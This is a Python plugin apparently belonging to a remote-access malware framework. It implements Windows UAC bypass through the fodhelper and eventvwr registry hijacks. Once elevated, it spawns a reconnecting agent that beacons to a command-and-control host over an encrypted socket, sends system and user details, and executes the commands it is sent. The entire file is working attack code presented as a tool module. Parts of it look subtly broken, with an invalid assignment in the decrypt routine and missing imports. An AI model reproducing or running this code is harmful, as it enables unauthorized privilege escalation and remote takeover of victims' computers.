PLUGIN = {"name": "uac_bypass", "desc": "UAC bypass for privilege escalation (fodhelper, eventvwr)", "deps": [], "size": 3.5}

STUB_CODE = r"""
import ctypes, sys, tempfile, atexit

def _uac_elevated_cmd():
    if getattr(sys, 'frozen', False):
        return f'"{sys.executable}"'
    if hasattr(sys.modules.get("__main__", None), "__file__") and sys.modules["__main__"].__file__:
        script = sys.modules["__main__"].__file__
        return f'"{sys.executable}" "{script}"'
    stub_path = os.path.join(tempfile.gettempdir(), f"whisper_elevated_{os.getpid()}.py")
    try:
        import __main__ as mm
        code = (inspect.getsource(mm) if hasattr(inspect, "getsource") else "") or ""
        if not code:
            code = str(mm.__code__.co_code) if hasattr(mm, "__code__") else ""
    except:
        code = ""
    if not code or len(code) < 500:
        code = (
            "import socket,base64,json,os,sys,struct,hashlib,hmac,time,threading,subprocess,platform\n"
            f"C2_HOST={C2_HOST!r};C2_PORT={C2_PORT}\n"
            f"ENCRYPTION_PASSWORD={ENCRYPTION_PASSWORD!r}\n"
            f"RECONNECT_DELAY={RECONNECT_DELAY}\n\n"
            "def _k(): return hashlib.pbkdf2_hmac('sha256',ENCRYPTION_PASSWORD.encode(),b'whisper_salt_2024',100000,32)\n"
            "def _eb(p,k):\n"
            "    iv=os.urandom(16);ks=b'';c=0\n"
            "    while len(ks)<len(p):\n"
            "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
            "    return iv+hmac.new(k,iv+bytes(x^y for x,y in zip(p,ks)),hashlib.sha256).digest()[:16]+bytes(x^y for x,y in zip(p,ks))\n"
            "def _db(d,k):\n"
            "    iv,tag,ct=d[:16],d[16:32],d[32:]\n"
            "    if not hmac.compare_digest(tag,hmac.new(k,iv+ct,hashlib.sha256).digest()[:16]):raise ValueError('integrity')\n"
            "    ks,b''=b'',0\n"
            "    while len(ks)<len(ct):\n"
            "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
            "    return bytes(x^y for x,y in zip(ct,ks))\n"
            "def enc(d):return base64.b64encode(_eb(json.dumps(d).encode(),_k()))\n"
            "def dec(d):return json.loads(_db(base64.b64decode(d),_k()))\n"
            "def rms(s):\n"
            "    r=s.recv(4)\n"
            "    if not r:return None\n"
            "    sz=int.from_bytes(r,'big');d=b''\n"
            "    while len(d)<sz:\n"
            "        c=s.recv(sz-len(d))\n"
            "        if not c:return None\n"
            "        d+=c\n"
            "    return dec(d)\n"
            "def sms(s,d):\n"
            "    p=enc(d);s.sendall(len(p).to_bytes(4,'big')+p)\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.settimeout(30);s.connect((C2_HOST,C2_PORT))\n"
            "sms(s,{'type':'init','os':platform.platform(),'hostname':platform.node(),'user':os.environ.get('USERNAME','?'),'arch':platform.machine(),'pid':os.getpid(),'elevated':True})\n"
            "s.settimeout(15)\n"
            "while True:\n"
            "    try:\n"
            "        m=rms(s)\n"
            "        if m is None:break\n"
            "        if m['type']=='exit':s.close();break\n"
            "        fn=_CMDS.get(m['type'])\n"
            "        if fn:\n"
            "            try:\n"
            "                r=fn(m)\n"
            "                if r is not None:sms(s,{'type':'response',**r})\n"
            "            except Exception as e:sms(s,{'type':'response','error':str(e)})\n"
            "    except socket.timeout:\n"
            "        sms(s,{'type':'ping'})\n"
        )
    with open(stub_path, "w", encoding="utf-8") as f:
        f.write(code)
    atexit.register(lambda: os.remove(stub_path) if os.path.exists(stub_path) else None)
    return f'"{sys.executable}" "{stub_path}"'

def _uac_fodhelper():
    import winreg
    try:
        cmd = _uac_elevated_cmd()
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        subprocess.Popen(["fodhelper.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _uac_eventvwr():
    import winreg
    try:
        cmd = _uac_elevated_cmd()
        key_path = r"Software\Classes\mscfile\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
        subprocess.Popen(["eventvwr.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _cmd_uac_bypass(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] UAC bypass is Windows-only"}
        if ctypes.windll.shell32.IsUserAnAdmin():
            return {"output": "[+] Already running as admin"}
        method = m.get("method", "fodhelper")
        ok = None
        if method in ("fodhelper", "auto"):
            ok = _uac_fodhelper()
        if not ok and method in ("eventvwr", "auto"):
            ok = _uac_eventvwr()
        if ok:
            return {"output": f"[+] UAC bypass triggered via {method}, elevated reconnecting agent spawned", "_exit": True}
        return {"output": "[!] UAC bypass failed"}
    except Exception as e: return {"output": f"[!] UAC bypass error: {e}"}
_CMDS["uac_bypass"] = _cmd_uac_bypass
"""

def get_commands():
    return {"uac_bypass": "_cmd_uac_bypass"}
